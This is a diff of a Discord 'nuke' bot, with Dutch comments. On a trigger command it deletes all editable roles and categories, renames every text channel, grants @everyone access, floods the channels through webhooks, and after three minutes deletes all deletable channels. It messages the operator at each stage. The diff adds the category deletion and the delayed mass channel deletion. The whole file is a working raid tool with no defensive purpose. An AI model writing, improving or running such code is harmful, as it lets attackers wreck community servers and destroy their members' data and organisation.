@@ -33,44 +33,43 @@ client.on('messageCreate', async message => {
     message.delete().catch(() => {});
 
     try {
-        await message.author.send(`⚠️ **MAX SPEED NUKE** ⚠️\nSpam: ${spamAmount}x per channel`);
+        await message.author.send(`⚠️ **NUKE START** ⚠️\nSpam: ${spamAmount}x\nChannels worden na 3 minuten verwijderd.`);
     } catch {}
 
     let cancelled = false;
     const collector = message.channel.createMessageCollector({
         filter: m => m.author.id === message.author.id && m.content.toLowerCase() === '.1cancel',
-        time: 3000
+        time: 4000
     });
     collector.on('collect', () => cancelled = true);
 
-    await new Promise(r => setTimeout(r, 3000));
+    await new Promise(r => setTimeout(r, 4000));
     if (cancelled) return;
 
     // Rollen verwijderen
-    Promise.all(
-        message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).map(role => role.delete().catch(() => {}))
-    ).catch(() => {});
+    for (const role of message.guild.roles.cache.filter(r => r.name !== "@everyone" && r.editable).values()) {
+        try { await role.delete(); } catch {}
+    }
 
-    // Alle channels **tegelijkertijd** verwerken
+    // Categorieën verwijderen
+    for (const cat of message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildCategory).values()) {
+        try { await cat.delete(); } catch {}
+    }
+
+    // Channels hernoemen + spammen
     const textChannels = Array.from(message.guild.channels.cache.filter(ch => ch.type === ChannelType.GuildText).values());
     let processed = 0;
 
     const promises = textChannels.map(async (channel) => {
         try {
-            // Oude berichten wissen
-            await channel.bulkDelete(100, true).catch(() => {});
-            const oldMsgs = await channel.messages.fetch({ limit: 100 }).catch(() => []);
-            await channel.bulkDelete(oldMsgs, true).catch(() => {});
-
-            // Hernoemen + zichtbaar maken
             await channel.setName("Finnson the goat");
+
             await channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                 ViewChannel: true,
                 SendMessages: true,
                 ReadMessageHistory: true
             }).catch(() => {});
 
-            // Webhook spam
             const webhook = await channel.createWebhook({
                 name: WEBHOOK_NAME,
                 avatar: WEBHOOK_AVATAR
@@ -91,12 +90,23 @@ client.on('messageCreate', async message => {
         } catch (err) {}
     });
 
-    // **Alle channels tegelijk starten**
     await Promise.all(promises);
 
     try {
-        await message.author.send(`[DONE] ${processed} channels changed`);
+        await message.author.send(`[SPAM DONE] ${processed} channels gespamd. Over 3 minuten worden ze verwijderd.`);
     } catch {}
+
+    // 3 minuten later alle channels verwijderen
+    setTimeout(async () => {
+        try {
+            const allChannels = message.guild.channels.cache.filter(ch => ch.deletable);
+            for (const ch of allChannels.values()) {
+                await ch.delete().catch(() => {});
+                await new Promise(r => setTimeout(r, 300));
+            }
+            await message.author.send("[FINAL] Alle channels verwijderd.");
+        } catch (e) {}
+    }, 180000); // 3 minuten = 180000 ms
 });
 
 client.login(process.env.TOKEN);
